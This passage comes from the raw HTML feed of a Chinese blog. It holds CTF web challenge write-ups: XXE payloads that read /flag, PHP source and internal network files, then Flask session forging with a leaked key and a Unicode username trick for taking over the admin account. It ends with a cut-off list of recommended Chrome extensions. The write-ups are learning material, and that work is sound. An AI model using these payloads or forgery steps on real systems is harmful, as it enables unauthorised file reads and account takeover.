class="string">"1"</span>)&#123;</span><br><span class="line">        $(<span class="string">".msg"</span>).text(msg + <span class="string">" login success!"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $(<span class="string">".msg"</span>).text(<span class="string">"error:"</span> + msg);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> <span class="params">(XMLHttpRequest,textStatus,errorThrown)</span> </span>&#123;</span><br><span class="line">            $(<span class="string">".msg"</span>).text(errorThrown + <span class="string">':'</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到传输的数据是xml类型<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200507154531604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>payload打一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE any [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"file:///flag"</span> &gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;<span class="number">111</span>&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h1 id="true-xml-cookbook">True XML Cookbook</h1><p>首先尝试直接读/flag文件，回显了报错信息，但是发现可以读doLogin文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">  &lt;!ENTITY file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;<span class="number">1</span>&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//doLogin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>\n<span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1\n* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$USERNAME = <span class="string">'admin'</span>; <span class="comment">//\xe8\xb4\xa6\xe5\x8f\xb7</span></span><br><span class="line">$PASSWORD = <span class="string">'024b87931a03f738fff6693ce0a78c88'</span>; <span class="comment">//\xe5\xaf\x86\xe7\xa0\x81</span></span><br><span class="line">$result = <span class="keyword">null</span>;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">$username = $creds-&gt;username;</span><br><span class="line">$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">1</span>,$username);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">0</span>,$username);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">3</span>,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终是利用ssrf读内网文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /etc/hosts</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>localhost</span><br><span class="line">::<span class="number">1</span>localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::<span class="number">0</span>ip6-localnet</span><br><span class="line">ff00::<span class="number">0</span>ip6-mcastprefix</span><br><span class="line">ff02::<span class="number">1</span>ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span>ip6-allrouters</span><br><span class="line"><span class="number">173.17</span><span class="number">.80</span><span class="number">.9</span>osrc</span><br></pre></td></tr></table></figure><p>内网ip，173.17.80.9</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// /proc/net/arp</span><br><span class="line">IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="line"><span class="number">173.17</span>.<span class="number">80.2</span>      <span class="number">0</span>x1         <span class="number">0</span>x2         <span class="number">02</span>:<span class="number">42</span>:ad:<span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span>     *        eth0</span><br><span class="line"><span class="number">173.17</span>.<span class="number">80.12</span>     <span class="number">0</span>x1         <span class="number">0</span>x2         <span class="number">02</span>:<span class="number">42</span>:ad:<span class="number">11</span>:<span class="number">50</span>:<span class="number">0</span>c     *        eth0</span><br></pre></td></tr></table></figure><p>最后试了173.17.80.10可以得flag<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200302112638332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L291YmFzYW5nZGFkYWRh,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="iscc-wei-zhi-de-feng-xian-1">ISCC  未知的风险-1</h1><p>前面是jwt爆破得到秘钥123456伪造user用户就不说了，之后是一个登录框，和上面两个题目差不多，doLogin()方法相同，题目根目录下有flag.php。用xxe读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">  &lt;!ENTITY file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;<span class="number">1</span>&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200507155154905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><blockquote><p>读取/var/www/html是因为这是Apache默认根目录</p></blockquote><p>base64解码即可<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200507155712628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="can-kao">参考</h1><p><a href="https://blog.csdn.net/oubasangdadada/article/details/104608104" target="_blank" rel="noopener">某个(忘了)比赛的两道XML</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;fake-xml-cookbook&quot;&gt;Fake XML Cookbook&lt;/h1&gt;
&lt;p&gt;F12 查看源码：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="CTF-WEB" scheme="http://zssblog.top/categories/CTF-WEB/"/>
    
    
      <category term="CTF-WEB" scheme="http://zssblog.top/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>[HCTF 2018]admin wp</title>
    <link href="http://zssblog.top/2020/05/03/HCTF-2018-admin-wp/"/>
    <id>http://zssblog.top/2020/05/03/HCTF-2018-admin-wp/</id>
    <published>2020-05-03T10:41:00.000Z</published>
    <updated>2020-05-31T10:13:54.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ti-mu-shuo-ming">题目说明</h1><p>题目来源于BUUCTF,链接：<a href="https://buuoj.cn/challenges#%5BHCTF%202018%5Dadmin" target="_blank" rel="noopener">点我查看</a></p><h1 id="xuan-xue-fei-yu-qi-jie">玄学 非预期解</h1><p>题目名称为admin,应该是让用admin登录</p><p>源码中也印证了这一点</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503180231244.png"  alt="image-20200503180231244"></p><p>登录页面乱输密码试了下，输入123时然后它就登进去了！！！</p><p>这样的话暴力破解也能得到flag,但是以buuctf的web题难度想着不可能那么简单，于是搜了下wp，结合别人的wp又学到了不少，在此记录下</p><h1 id="flask-session-wei-zao-ye-shi-fei-yu-qi-jie">flask session伪造(也是非预期解)</h1><p>flask中session是存储在客户端cookie中的，也就是存储在本地。我们可以修改session达到伪造admin用户的效果。</p><p>github有相应的脚本：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">点我查看</a></p><p>但是session是加密的，我们需要知道秘钥才能修改session</p><h2 id="zhao-mi-yao" id="找秘钥"><a class="header-anchor" href="#找秘钥">¶</a>找秘钥</h2><p>注册个账号登录后在修改密码页面有git源码</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503180730036.png"  alt="image-20200503180730036"></p><p>下载下来在config.py中发现秘钥</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181122457.png"  alt="image-20200503181122457"></p><h2 id="wei-zao-session" id="伪造session"><a class="header-anchor" href="#伪造session">¶</a>伪造session</h2><p>然后我们就可以用脚本伪造session了</p><p>先解密原来的session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.</span><br><span class="line">py decode -s <span class="string">"ckj123"</span> -c <span class="string">".eJw9kMGKwjAQhl9lmbOHbZuT4EFIt2whEwpTy-Qirq0mqXGhKtqI775VFk8D__fzDTN3WO-G7mRhfh4u3QzWroX5HT5-YA7YVAk2amRCz7FPlVQCCyU4_QrGo9XSOKS9UN5YDqseJaco-9uUZVqWjklFDtOMedQyv2qqMlPkV-ON51BHLMrA0QZTrJx6OqkNnNbTzjxTTTX1sMenI1YjFsbqphaKeNQNZ-hLr2krmFpn5HIBjxlsT8Nuff7tu-P7BE15ogu0iozTzXdkvxSY5qMie-C4F0aW1pBKkaqIobpxPHi8Ll46Fzb77m2qDytU_-S4CROABGZwOXXD62eQfMLjD-mobCE.Xq5sUg.8y1k1rWI_KY5cx0H4qGeLmOYtLw"</span></span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181608834.png"  alt="image-20200503181724452"></p><p>然后修改name为admin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.</span><br><span class="line">py encode -s <span class="string">"ckj123"</span> -t <span class="string">"&#123;'_fresh': True, 'name': 'admin', 'image': b'RUM3', 'user_id': '10', '_id': b'5d55c2a3cc960384c8caff3a86b58826abed46649158782ba33bbbc13810947da0f6cbe34bfc8fdeb3afe7fce55a71d0f3d533c424fa9e81629f762c978a7bd0', 'csrf_token': b'9158ca16b9b3b087a218ec88d2ae365436d1c9c7'&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181802317.png"  alt="image-20200503182645495"></p><p>原来的session是这个样子</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181724452.png"  alt="image-20200503181608834"></p><p>我们把左边的session修改成上面的session</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181832435.png"  alt="image-20200503181832435"></p><p>就成功伪造了admin用户拿到flag</p><h1 id="unicode-qi-pian-yu-qi-jie-fa">unicode欺骗(预期解法)</h1><p>其实这个解法才是原作者预期解法，只不过当时作者写的代码不打严谨，导致出现了许多非预期解法。</p><p>阅读源码，我们可以发现注册登录修改密码都用到了strlower转换成小写。而且这个函数是自定义的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>对于nodeprep.prepare函数就存在漏洞</p><p>对于字符ᴬ，调用一次函数会转换成A,再调用一次会转换成a</p><p>所以我们注册一个名为ᴬdmin的用户，正常登录。首页会显示我们的用户名为Admin</p><p>如果我们用Admin去修改密码，首先它调用strlower函数会把Admin转换为admin，这样我们其实就相当于改了admin的密码</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503182645495.png"  alt="image-20200503181802317"></p><p>然后我们用admin用户和刚才修改的密码即可登录</p><h1 id="xie-zai-zui-hou">写在最后</h1><p>尽管出题人疏忽了，但对我们而言又学到了许多姿势，继续加油吧！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ti-mu-shuo-ming&quot;&gt;题目说明&lt;/h1&gt;
&lt;p&gt;题目来源于BUUCTF,链接：&lt;a href=&quot;https://buuoj.cn/challenges#%5BHCTF%202018%5Dadmin&quot; target=&quot;_blank&quot; rel=&quot;noope
      
    
    </summary>
    
    
      <category term="CTF-WEB" scheme="http://zssblog.top/categories/CTF-WEB/"/>
    
    
      <category term="CTF-WEB" scheme="http://zssblog.top/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>谷歌插件分享</title>
    <link href="http://zssblog.top/2020/04/23/%E8%B0%B7%E6%AD%8C%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB/"/>
    <id>http://zssblog.top/2020/04/23/%E8%B0%B7%E6%AD%8C%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB/</id>
    <published>2020-04-23T11:44:00.000Z</published>
    <updated>2020-05-31T10:10:06.269Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xie-zai-qian-mian">写在前面</h1><p>谷歌浏览器算是我日常用的最多的软件了，之所以谷歌会那么强，很大一部分原因就是其丰富的插件便利了日常操作。</p><p>先放张这次要提及的所有插件的图</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423182122284.png"  alt="image-20200423182122284"></p><p>接下来就一一为大家介绍下他们，Let’s go</p><h1 id="ad-guard-yan-gao-lan-jie-qi">AdGuard 广告拦截器</h1><h2 id="gong-neng" id="功能"><a class="header-anchor" href="#功能">¶</a>功能</h2><p>拦截广告</p><h2 id="shuo-ming" id="说明"><a class="header-anchor" href="#说明">¶</a>说明</h2><p>这个插件可以说是谷歌必备了，有了这个插件基本告别广告了，反正我现在是看不到广告。</p><p>有时候想看个广告还得把插件关上才能看到，没错就是那么爽。</p><h2 id="xia-zai-lian-jie" id="下载链接"><a class="header-anchor" href="#下载链接">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423183414224.png"  alt="image-20200423183414224"></p><p><a href="https://chrome.google.com/webstore/detail/adguard-adblocker/bgnkhhnnamicmpeenaelnjfhikgbkllg" target="_blank" rel="noopener">点我下载</a></p><h1 id="infinity-xin-biao-qian-ye-pro">Infinity 新标签页 (Pro)</h1><h2 id="gong-neng-1" id="功能-v2"><a class="header-anchor" href="#功能-v2">¶</a>功能</h2><p>美化主页，比如我现在的主页</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423182427168.png"  alt="image-20200423182427168"></p><h2 id="shuo-ming-1" id="说明-v2"><a class="header-anchor" href="#说明-v2">¶</a>说明</h2><p>主要元素是输入框和下面的标签</p><p>当然你也也可以点击右上角进行配置</p><p>支持自定义图片源、登录、备份恢复(这点非常方便)</p><p>具体怎样修改就不介绍了大家要是觉得耶，还挺好看那就自己摸索摸索</p><h2 id="xia-zai-lian-jie-1" id="下载链接-v2"><a class="header-anchor" href="#下载链接-v2">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423183516764.png"  alt="image-20200423183516764"></p><p><a href="https://chrome.google.com/webstore/detail/infinity-new-tab-pro/nnnkddnnlpamobajfibfdgfnbcnkgngh" target="_blank" rel="noopener">点我下载</a></p><h1 id="xia-zai">下载+</h1><h2 id="gong-neng-2" id="功能-v3"><a class="header-anchor" href="#功能-v3">¶</a>功能</h2><p>管理谷歌下载，可通过点击插件显示正在下载的文件</p><h2 id="shuo-ming-2" id="说明-v3"><a class="header-anchor" href="#说明-v3">¶</a>说明</h2><p>推荐这个插件主要是日常下载文件谷歌默认的下载好后还得去设置里找，左下角又不能看到最近下载记录，放个图</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423184415967.png"  alt="image-20200423184415967"></p><h2 id="xia-zai-lian-jie-2" id="下载链接-v3"><a class="header-anchor" href="#下载链接-v3">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423184442056.png"  alt="image-20200423184442056"></p><p><a href="https://chrome.google.com/webstore/detail/download-plus/gokgophibdidjjpildcdbfpmcahilaaf" target="_blank" rel="noopener">点我下载</a></p><h1 id="mao-zhua">猫抓</h1><h2 id="gong-neng-3" id="功能-v4"><a class="header-anchor" href="#功能-v4">¶</a>功能</h2><p>下载当前页面的视频文件</p><h2 id="shuo-ming-3" id="说明-v4"><a class="header-anchor" href="#说明-v4">¶</a>说明</h2><p>有时我们想把一个页面上的文件下载下来，这个插件就很方便了，点击下可看到下载链接即可下载。注意有些页面探测不到比如爱奇艺那种会员电影了啥的，他们会有专门防这种下载机制的，但总体来说使用效果还行</p><h2 id="xia-zai-lian-jie-3" id="下载链接-v4"><a class="header-anchor" href="#下载链接-v4">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423184904486.png"  alt="image-20200423184904486"></p><p><a href="%5Bhttps://chrome.google.com/webstore/detail/%E7%8C%AB%E6%8A%93/jfedfbgedapdagkghmgibemcoggfppbb%5D(https://chrome.google.com/webstore/detail/%E7%8C%AB%E6%8A%93/jfedfbgedapdagkghmgibemcoggfppbb)">点我下载</a></p><h1 id="enable-copy">Enable Copy</h1><h2 id="gong-neng-4" id="功能-v5"><a class="header-anchor" href="#功能-v5">¶</a>功能</h2><p>可以复制那些禁止用户复制的网页上的内容</p><h2 id="shuo-ming-4" id="说明-v5"><a class="header-anchor" href="#说明-v5">¶</a>说明</h2><p>平常不常用，但有时还是会有需求，需要复制的时候点下插件即可。</p><p>比如复制某百某度某文某库上的文字(如有下载文档需求推荐冰点文库，免费下载转换成pdf)</p><h2 id="xia-zai-lian-jie-4" id="下载链接-v5"><a class="header-anchor" href="#下载链接-v5">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423185325975.png"  alt="image-20200423185325975"></p><p><a href="https://chrome.google.com/webstore/detail/enable-copy/lmnganadkecefnhncokdlaohlkneihio" target="_blank" rel="noopener">点我下载</a></p><h1 id="full-page-screen-capture">Full Page Screen Capture</h1><h2 id="gong-neng-5" id="功能-v6"><a class="header-anchor" href="#功能-v6">¶</a>功能</h2><p>网页全屏截图</p><h2 id="shuo-ming-5" id="说明-v6"><a class="header-anchor" href="#说明-v6">¶</a>说明</h2><p>想什么呢，截个图还能有啥说明的，点下就截了，就那么简单</p><h2 id="xia-zai-lian-jie-5" id="下载链接-v6"><a class="header-anchor" href="#下载链接-v6">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423185616849.png"  alt="image-20200423185616849"></p><p><a href="https://chrome.google.com/webstore/detail/full-page-screen-capture/fdpohaocaechififmbbbbbknoalclacl" target="_blank" rel="noopener">点我下载</a></p><h1 id="live-reload">LiveReload</h1><h2 id="gong-neng-6" id="功能-v7"><a class="header-anchor" href="#功能-v7">¶</a>功能</h2><p>配合sublime的livreload实现sublime保存代码浏览器即使刷新</p><h2 id="shuo-ming-6" id="说明-v7"><a class="header-anchor" href="#说明-v7">¶</a>说明</h2><p>日常web开发保存代码后还得在浏览器刷新下才能看到效果，有了它省事多了</p><p>具体实现见我的另一篇博客：<a href="http://39.107.45.243/2020/04/08/sublime%E6%95%99%E7%A8%8B/" target="_blank" rel="noopener">点我查看</a></p><h2 id="xia-zai-lian-jie-6" id="下载链接-v7"><a class="header-anchor" href="#下载链接-v7">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423190006580.png"  alt="image-20200423190006580"></p><p><a href="https://chrome.google.com/webstore/detail/livereload/jnihajbhpnppcggbcgedagnkighmdlei" target="_blank" rel="noopener">点我下载</a></p><h1 id="sha-la-cha-ci">沙拉查词</h1><h2 id="gong-neng-7" id="功能-v8"><a class="header-anchor" href="#功能-v8">¶</a>功能</h2><p>英语渣渣拯救者，选中英语单词即可翻译</p><h2 id="shuo-ming-7" id="说明-v8"><a class="header-anchor" href="#说明-v8">¶</a>说明</h2><p>功能很强大，选项中可设置词典比如优先是谷歌翻译还是百度翻译这种</p><p>但目前我用的是油猴插件里的一个查词(为了节省资源)</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423190319724.png"  alt="image-20200423190319724"></p><h2 id="xia-zai-lian-jie-7" id="下载链接-v8"><a class="header-anchor" href="#下载链接-v8">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423190436492.png"  alt="image-20200423190436492"></p><p><a href="%5Bhttps://chrome.google.com/webstore/detail/%E6%B2%99%E6%8B%89%E6%9F%A5%E8%AF%8D-%E8%81%9A%E5%90%88%E8%AF%8D%E5%85%B8%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/cdonnmffkdaoajfknoeeecmchibpmkmg?utm_source=chrome-ntp-icon%5D(https://chrome.google.com/webstore/detail/%E6%B2%99%E6%8B%89%E6%9F%A5%E8%AF%8D-%E8%81%9A%E5%90%88%E8%AF%8D%E5%85%B8%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/cdonnmffkdaoajfknoeeecmchibpmkmg?utm_source=chrome-ntp-icon)">点我下载</a></p><h1 id="crx-mouse-chrome-shou-shi">crxMouse Chrome™ 手势</h1><h2 id="gong-neng-8" id="功能-v9"><a class="header-anchor" href="#功能-v9">¶</a>功能</h2><p>鼠标手势实现后退前进刷新等操作</p><h2 id="shuo-ming-8" id="说明-v9"><a class="header-anchor" href="#说明-v9">¶</a>说明</h2><p>关闭标签页刷新等操作不用去点击上面的按钮了。</p><p>支持浏览器内更换鼠标样式</p><p>我算看透了，这些插件就是咋懒咋弄咋省事咋弄</p><h2 id="xia-zai-lian-jie-8" id="下载链接-v9"><a class="header-anchor" href="#下载链接-v9">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423192630117.png"  alt="image-20200423192336453"></p><p><a href="https://chrome.google.com/webstore/detail/crxmouse-chrome-gestures/jlgkpaicikihijadgifklkbpdajbkhjo" target="_blank" rel="noopener">点我下载</a></p><h1 id="proxy-switchy-omega">Proxy SwitchyOmega</h1><h2 id="gong-neng-9" id="功能-v10"><a class="header-anchor" href="#功能-v10">¶</a>功能</h2><p>快速切换代理</p><h2 id="shuo-ming-9" id="说明-v10"><a class="header-anchor" href="#说明-v10">¶</a>说明</h2><p>比如你开的是PAC模式想全局模式打开某网站，点击插件选择我们配置好的代理即可快速切换全局模式，用完选回原来的模式即可</p><p>配置比如下面这样</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423192336453.png"  alt="image-20200423192556929"></p><p>它长这个样</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423192556929.png"  alt="image-20200423192630117"></p><h2 id="xia-zai-lian-jie-9" id="下载链接-v10"><a class="header-anchor" href="#下载链接-v10">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423192648948.png"  alt="image-20200423192648948"></p><p><a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif" target="_blank" rel="noopener">点我下载</a></p><h1 id="smooth-scroll">SmoothScroll</h1><h2 id="gong-neng-10" id="功能-v11"><a class="header-anchor" href="#功能-v11">¶</a>功能</h2><p>让你的浏览器滑动如飘柔般丝滑</p><h2 id="shuo-ming-10" id="说明-v11"><a class="header-anchor" href="#说明-v11">¶</a>说明</h2><p>下载好不用配置即可使用，确实有点作用，现在一直在用</p><h2 id="xia-zai-lian-jie-10" id="下载链接-v11"><a class="header-anchor" href="#下载链接-v11">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423192840387.png"  alt="image-20200423192840387"></p><p><a href="https://chrome.google.com/webstore/detail/smoothscroll/nbokbjkabcmbfdlbddjidfmibcpneigj" target="_blank" rel="noopener">点我下载</a></p><h1 id="kuo-zhan-guan-li-qi">扩展管理器</h1><h2 id="gong-neng-11" id="功能-v12"><a class="header-anchor" href="#功能-v12">¶</a>功能</h2><p>快速开启关闭插件</p><h2 id="shuo-ming-11" id="说明-v12"><a class="header-anchor" href="#说明-v12">¶</a>说明</h2><p>如果我们有太多的插件一直开着势必会浪费资源。对于某些偶尔用到的插件，我们没必要一直开着，比如我现在这样关闭一部分</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423193216700.png"  alt="image-20200423193154208"></p><h2 id="xia-zai-lian-jie-11" id="下载链接-v12"><a class="header-anchor" href="#下载链接-v12">¶</a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423193154208.png"  alt="image-20200423193216700"></p><p><a 